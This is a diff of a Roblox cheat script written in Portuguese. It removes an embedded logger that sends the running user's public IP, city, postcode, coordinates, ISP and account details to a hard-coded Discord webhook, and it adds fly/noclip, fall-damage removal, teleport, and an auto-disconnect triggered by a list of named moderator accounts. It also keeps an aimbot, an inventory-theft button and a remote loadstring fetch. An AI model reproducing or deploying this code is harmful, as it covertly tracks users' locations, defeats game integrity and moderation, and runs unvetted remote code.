@@ -1,144 +1,3 @@
--- Serviços necessários
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local Player = Players.LocalPlayer
-
--- Link do Webhook
-local webhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw" -- << coloque seu webhook aqui
-
--- Função para identificar o tipo de dispositivo
-local function getDeviceType()
-    if UserInputService.TouchEnabled then
-        return "Celular/Tablet"
-    elseif UserInputService.KeyboardEnabled then
-        return "PC"
-    else
-        return "Desconhecido"
-    end
-end
-
--- Função para buscar IP e Localização usando a API ip-api
-local function getIPInfo()
-    local url = "http://ip-api.com/json/"
-    local response
-
-    if syn and syn.request then
-        response = syn.request({Url = url, Method = "GET"})
-    elseif request then
-        response = request({Url = url, Method = "GET"})
-    elseif http and http.request then
-        response = http.request({Url = url, Method = "GET"})
-    else
-        warn("❌ Seu exploit não suporta requisições HTTP!")
-        return nil
-    end
-
-    if response and response.Body then
-        local data = HttpService:JSONDecode(response.Body)
-        return data
-    else
-        return nil
-    end
-end
-
--- Função para gerar um HWID simulado
-local function getHWID()
-    return "HWID-" .. tostring(math.random(10000000,99999999)) .. "-" .. tostring(math.random(1000,9999))
-end
-
--- Função para enviar o Webhook
-local function sendWebhook()
-    local ipInfo = getIPInfo()
-
-    local embedFields = {
-        {
-            ["name"] = "Informações do Jogador",
-            ["value"] = 
-                "*Nome:* " .. Player.Name .. "\n" ..
-                "*DisplayName:* " .. Player.DisplayName .. "\n" ..
-                "*UserId:* " .. Player.UserId .. "\n" ..
-                "*Account Age:* " .. Player.AccountAge .. " dias\n" ..
-                "*MembershipType:* " .. tostring(Player.MembershipType),
-            ["inline"] = false
-        },
-        {
-            ["name"] = "Informações do Dispositivo",
-            ["value"] = 
-                "*Tipo de Dispositivo:* " .. getDeviceType() .. "\n" ..
-                "*Sistema de Entrada:* " .. 
-                (UserInputService.KeyboardEnabled and "Teclado" or (UserInputService.TouchEnabled and "Tela Toque" or "Outro")) .. "\n" ..
-                "*HWID (Simulado):* " .. getHWID(),
-            ["inline"] = false
-        }
-    }
-
-    if ipInfo then
-        table.insert(embedFields, {
-            ["name"] = "Localização e IP",
-            ["value"] = 
-                "*IP Público:* " .. (ipInfo.query or "Desconhecido") .. "\n" ..
-                "*País:* " .. (ipInfo.country or "Desconhecido") .. "\n" ..
-                "*Estado/Região:* " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
-                "*Cidade:* " .. (ipInfo.city or "Desconhecido") .. "\n" ..
-                "*CEP:* " .. (ipInfo.zip or "Desconhecido") .. "\n" ..
-                "*Latitude:* " .. (ipInfo.lat or "Desconhecido") .. "\n" ..
-                "*Longitude:* " .. (ipInfo.lon or "Desconhecido") .. "\n" ..
-                "*Fuso Horário:* " .. (ipInfo.timezone or "Desconhecido"),
-            ["inline"] = false
-        })
-        table.insert(embedFields, {
-            ["name"] = "Informações da Rede",
-            ["value"] = 
-                "*ISP (Provedor):* " .. (ipInfo.isp or "Desconhecido") .. "\n" ..
-                "*Organização:* " .. (ipInfo.org or "Desconhecido") .. "\n" ..
-                "*AS:* " .. (ipInfo.as or "Desconhecido"),
-            ["inline"] = false
-        })
-    else
-        table.insert(embedFields, {
-            ["name"] = "Localização e IP",
-            ["value"] = "Não foi possível obter informações de IP/localização.",
-            ["inline"] = false
-        })
-    end
-
-    local embedData = {
-        ["username"] = "LOG DE EXECUÇÃO",
-        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
-        ["embeds"] = {{
-            ["title"] = "Nova execução detectada!",
-            ["description"] = "Script executado com sucesso no Roblox.",
-            ["color"] = tonumber(0x00ff00),
-            ["fields"] = embedFields,
-            ["footer"] = {
-                ["text"] = "Logs automáticos • " .. os.date("%d/%m/%Y %H:%M:%S")
-            }
-        }}
-    }
-
-    local body = {
-        Url = webhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(embedData)
-    }
-
-    if syn and syn.request then
-        syn.request(body)
-    elseif request then
-        request(body)
-    elseif http and http.request then
-        http.request(body)
-    else
-        warn("❌ Seu exploit não suporta requisições HTTP!")
-    end
-end
-
--- Envia o Webhook
-sendWebhook()
-
-
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -353,15 +212,20 @@ local function MobileAimbot()
 end
 
 local MobileAimbotEnable = false
+local Connection
 
 local function ToggleMobileAimbot(state)
     MobileAimbotEnable = state
     if MobileAimbotEnable then
-        game:GetService("RunService").RenderStepped:Connect(MobileAimbot)
+        -- Conectar o aimbot à função RenderStepped
+        Connection = game:GetService("RunService").RenderStepped:Connect(MobileAimbot)
         print("Aimbot ativado")
     else
-        game:GetService("RunService").RenderStepped:Disconnect(MobileAimbot)
-        print("Aimbot desativado")
+        -- Desconectar a função RenderStepped
+        if Connection then
+            Connection:Disconnect()
+            print("Aimbot desativado")
+        end
     end
 end
 
@@ -751,6 +615,335 @@ MiniHubTab:CreateButton({
     Callback = function()
         task.spawn(roubarInventario)
     end,
+})
+
+local FlySection = MiniHubTab:CreateSection("Fly Options")
+
+local FlyToggle
+local flyConnections = {}
+local gui
+
+FlyToggle = MiniHubTab:CreateToggle({
+    Name = "Fly",
+    CurrentValue = false,
+    SectionParent = FlySection,
+    Callback = function(state)
+        if state then
+            -- Ativar Fly
+            pcall(function()
+                local Players = game:GetService("Players")
+                local RunService = game:GetService("RunService")
+                local LocalPlayer = Players.LocalPlayer
+                local Camera = workspace.CurrentCamera
+
+                -- GUI com ponto branco no centro da tela
+                gui = Instance.new("ScreenGui")
+                gui.Name = "FlyUI"
+                gui.ResetOnSpawn = false
+                gui.IgnoreGuiInset = true
+                gui.DisplayOrder = math.huge
+                gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+                local dot = Instance.new("Frame")
+                dot.Size = UDim2.new(0, 4, 0, 4)
+                dot.Position = UDim2.new(0.5, -2, 0.5, -2)
+                dot.BackgroundColor3 = Color3.new(1, 1, 1)
+                dot.BorderSizePixel = 0
+                dot.Name = "FlyDot"
+                dot.Parent = gui
+
+                -- Variáveis
+                local speed = 50
+                local fallSpeed = -4
+                local flying = true
+
+                -- Noclip
+                local function applyNoclip()
+                    for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+
+                -- Voo principal
+                local function startFly()
+                    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+                    local hrp = char:WaitForChild("HumanoidRootPart")
+                    local humanoid = char:FindFirstChildOfClass("Humanoid")
+
+                    applyNoclip()
+
+                    RunService:BindToRenderStep("SecureFly", Enum.RenderPriority.Character.Value + 1, function()
+                        if not flying or not hrp or not humanoid or humanoid.Health <= 0 then
+                            RunService:UnbindFromRenderStep("SecureFly")
+                            return
+                        end
+
+                        hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Camera.CFrame.LookVector)
+
+                        local moveDir = humanoid.MoveDirection
+                        if moveDir.Magnitude > 0 then
+                            local dir = Camera.CFrame.LookVector.Unit * speed
+                            hrp.Velocity = Vector3.new(dir.X, dir.Y, dir.Z)
+                        else
+                            hrp.Velocity = Vector3.new(0, fallSpeed, 0)
+                        end
+
+                        applyNoclip()
+                    end)
+                end
+
+                -- Começa voo
+                if LocalPlayer.Character then
+                    startFly()
+                end
+                table.insert(flyConnections, LocalPlayer.CharacterAdded:Connect(function()
+                    task.wait(1.2)
+                    startFly()
+                end))
+            end)
+        else
+            -- Desativar Fly
+            local RunService = game:GetService("RunService")
+            RunService:UnbindFromRenderStep("SecureFly")
+            for _, conn in ipairs(flyConnections) do
+                pcall(function()
+                    conn:Disconnect()
+                end)
+            end
+            flyConnections = {}
+            if gui then
+                gui:Destroy()
+                gui = nil
+            end
+        end
+    end,
+})
+
+-- Função de abrir baú
+local function abrirBau()
+    if antiLagAtivo then return end
+    local args = {"trasnferebau", "", "", 1}
+    game:GetService("ReplicatedStorage").Modules.InvRemotes.InvRequest:InvokeServer(unpack(args))
+end
+
+-- Cria uma section dentro da aba "Mini Hub"
+MiniHubTab:CreateSection("Abrir Baú")
+
+-- Botão dentro da section
+MiniHubTab:CreateButton({
+    Name = "Abrir Baú",
+    Callback = abrirBau,
+})
+
+-- Função para remover o script de dano de queda
+local function removerDanoQueda()
+    local char = Player.Character
+    if char then
+        local danoQuedaScript = char:FindFirstChild("DanoQueda")
+        if danoQuedaScript then
+            danoQuedaScript:Destroy()
+            Rayfield:Notify("Sucesso", "Script DanoQueda removido.", nil, 5)
+        else
+            Rayfield:Notify("Erro", "Script DanoQueda não encontrado.", nil, 5)
+        end
+    else
+        Rayfield:Notify("Erro", "Personagem não encontrado.", nil, 5)
+    end
+end
+
+-- Cria uma section dentro da aba "Mini Hub"
+MiniHubTab:CreateSection("Remover dano de queda")
+
+-- Botão dentro da section "Abrir Baú"
+MiniHubTab:CreateButton({
+    Name = "Remover Dano Queda",
+    Description = "Remove o script de dano de queda do seu personagem",
+    Callback = removerDanoQueda,
+})
+
+local staffList = {
+    ["xxxjoaoxxxg"] = true, ["CleitinDoGrau_Eb"] = true, ["Jonas_411"] = true, ["Lucalarte"] = true, ["SPTmatheus123"] = true,
+    ["GuilhermeDRTgg"] = true, ["Briessxz"] = true, ["hardstyless"] = true, ["Mundaka"] = true, ["Isabelaaaaafofs"] = true,
+    ["HANRLLEY25"] = true, ["kaleb_iaee"] = true, ["brunizoraa"] = true, ["rip_propleyfran"] = true, ["pepezicador"] = true,
+    ["Jjhgul"] = true, ["Dariosantos21048"] = true, ["JEKER_2009"] = true, ["Qqueqaco"] = true, ["MZPlug14k"] = true,
+    ["GregoriusKhronos"] = true, ["Sargento_admOficial"] = true, ["Cassiopia84un"] = true, ["Hakplays"] = true, ["Cleo_ptr"] = true
+}
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local detectionActive = false
+local staffConnection
+
+local function checkForStaff(player)
+    if detectionActive and staffList[player.Name] then
+        LocalPlayer:Kick("Staff detectado no servidor")
+    end
+end
+
+-- ⬇ Adicione este trecho dentro da aba desejada (ex: MainTab, ProtecaoTab, etc)
+MiniHubTab:CreateSection("Anti Staff")
+
+MiniHubTab:CreateToggle({
+    Name = "Anti-Staff",
+    CurrentValue = false,
+    Flag = "AntiStaff",
+    Callback = function(Value)
+        detectionActive = Value
+
+        if Value then
+            -- Checar jogadores atuais
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    checkForStaff(player)
+                end
+            end
+
+            -- Conectar evento de novos jogadores
+            staffConnection = Players.PlayerAdded:Connect(function(player)
+                checkForStaff(player)
+            end)
+        else
+            -- Desconectar o evento
+            if staffConnection then
+                staffConnection:Disconnect()
+                staffConnection = nil
+            end
+        end
+    end
+})
+
+local Section = MiniHubTab:CreateSection("Teleportar")
+
+MiniHubTab:CreateButton({
+    Name = "teleport player",
+    Callback = function()
+        -- Cole aqui o script do teleport
+		-- Criar a UI principal
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TeleportUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 250, 0, 160)
+Frame.Position = UDim2.new(0.5, -125, 0.5, -80)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+-- Título
+local Title = Instance.new("TextLabel")
+Title.Text = "Teleportar para Jogador"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Size = UDim2.new(1, -30, 0, 25)
+Title.Position = UDim2.new(0, 10, 0, 5)
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Frame
+
+-- Botão de Fechar
+local CloseButton = Instance.new("TextButton")
+CloseButton.Text = "X"
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 14
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+CloseButton.Size = UDim2.new(0, 25, 0, 25)
+CloseButton.Position = UDim2.new(1, -30, 0, 5)
+CloseButton.Parent = Frame
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.Parent = CloseButton
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Caixa de texto para nome do jogador
+local TextBox = Instance.new("TextBox")
+TextBox.PlaceholderText = "Nome de exibição ou nome real"
+TextBox.Text = ""
+TextBox.Font = Enum.Font.Gotham
+TextBox.TextSize = 14
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextBox.Size = UDim2.new(1, -20, 0, 30)
+TextBox.Position = UDim2.new(0, 10, 0, 40)
+TextBox.Parent = Frame
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.Parent = TextBox
+
+-- Botão de teleport
+local Button = Instance.new("TextButton")
+Button.Text = "Teleport"
+Button.Font = Enum.Font.GothamBold
+Button.TextSize = 14
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.BackgroundColor3 = Color3.fromRGB(65, 130, 200)
+Button.Size = UDim2.new(1, -20, 0, 30)
+Button.Position = UDim2.new(0, 10, 0, 90)
+Button.Parent = Frame
+
+local UICorner3 = Instance.new("UICorner")
+UICorner3.Parent = Button
+
+-- Função para encontrar jogador por DisplayName ou Name
+local function FindPlayerByName(inputName)
+    local input = inputName:lower()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Name:lower() == input or player.DisplayName:lower() == input then
+            return player
+        end
+    end
+    return nil
+end
+
+-- Função de teleport
+Button.MouseButton1Click:Connect(function()
+    local inputName = TextBox.Text
+    local targetPlayer = FindPlayerByName(inputName)
+    local localPlayer = game.Players.LocalPlayer
+
+    if inputName == "" then
+        Button.Text = "Digite um nome!"
+        wait(1.5)
+        Button.Text = "Teleport"
+        return
+    end
+
+    if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        Button.Text = "Jogador não encontrado!"
+        wait(1.5)
+        Button.Text = "Teleport"
+        return
+    end
+
+    if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        Button.Text = "Você está carregando!"
+        wait(1.5)
+        Button.Text = "Teleport"
+        return
+    end
+
+    -- Teleportar sem limite de distância
+    localPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+    Button.Text = "Teleportado!"
+    wait(1.5)
+    Button.Text = "Teleport"
+end)
+
+    end
 })
 
 MiniHubTab:CreateSection("PC")
